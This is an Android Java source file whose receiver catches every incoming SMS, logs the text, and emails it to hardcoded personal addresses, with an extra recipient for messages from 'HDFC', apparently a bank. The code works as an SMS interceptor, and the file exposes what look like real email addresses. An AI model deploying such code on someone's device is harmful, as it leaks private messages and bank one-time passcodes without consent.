package com.example.persistentbackgroundservice;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

import static com.example.persistentbackgroundservice.EmailRoutines.send_email_using_gmail;
import static com.example.persistentbackgroundservice.SmsFilter.isBodyContains;
import static com.example.persistentbackgroundservice.SmsFilter.isFromSender;

import java.util.ArrayList;


public class MessageReceiver extends BroadcastReceiver {
    String TAG = "MessageReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        ArrayList<String> receiverEmails = new ArrayList<>();
        receiverEmails.add("neeraj76@yahoo.com");

        //message will be holding complete sms that is received
        SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        for(SmsMessage sms : messages)
        {
            if (isFromSender(sms, "HDFC")) {
                receiverEmails.add("mkhar19@gmail.com");
            }

            if (isBodyContains(sms, "Test")) {
                receiverEmails.add("neeraj76@gmail.com");
            }

            String msg = sms.getMessageBody();
            Log.i(TAG, msg);

            String subject = String.format("SMS Transaction [%s]", sms.getOriginatingAddress());

            send_email_using_gmail(subject, msg, receiverEmails);

            Log.i(TAG, "Email sent successfully.");
        }
    }
}
